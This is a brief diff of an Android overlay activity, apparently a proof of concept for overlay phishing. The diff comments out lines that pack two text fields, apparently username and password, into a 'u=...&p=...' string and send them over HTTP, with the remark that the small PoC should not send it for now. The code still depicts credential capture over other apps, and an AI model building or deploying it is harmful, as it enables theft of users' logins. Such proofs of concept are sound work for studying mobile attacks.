@@ -152,9 +152,9 @@ public class OverlayActivity extends Activity {
 				
 				if(!third_test.getText().toString().isEmpty()){
 					
-					
-					String result = "u="+second_test.getText().toString()+"&p="+third_test.getText().toString();
-					(new HttpDataSender()).execute(result);
+					//Don't send it for now in this small PoC
+					//String result = "u="+second_test.getText().toString()+"&p="+third_test.getText().toString();
+					//(new HttpDataSender()).execute(result);
 					
 					//Home button
 		            Intent i = new Intent(Intent.ACTION_MAIN);
